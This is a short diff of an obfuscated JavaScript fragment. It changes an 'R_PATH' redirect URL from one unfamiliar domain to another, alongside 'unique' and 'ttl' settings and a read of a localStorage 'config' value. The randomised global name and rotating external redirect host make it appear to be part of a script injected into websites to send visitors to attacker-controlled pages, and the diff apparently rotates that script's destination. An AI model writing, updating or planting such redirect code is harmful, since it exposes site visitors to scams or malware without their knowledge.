@@ -14,7 +14,7 @@
         window._Y5D6S3Hqy8vQn86V = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://snorfle.live/3HthVPfk',
+            R_PATH: 'https://kryzinta.pro/3HthVPfk',
         };
     }
     const _d7GCCRnr73x1F4kd = localStorage.getItem('config');
